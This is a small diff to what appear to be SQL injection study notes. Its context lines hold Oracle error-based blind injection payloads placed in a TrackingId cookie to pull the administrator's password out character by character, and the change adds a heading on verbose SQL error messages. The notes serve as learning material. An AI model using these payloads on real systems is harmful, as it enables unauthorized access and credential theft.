@@ -66,7 +66,9 @@
 >- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 >- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
 >- and so on...
-/gitcomm
+### verbose SQL error messages
+
+
 # Subverting application logic
 
 ## simple attack 
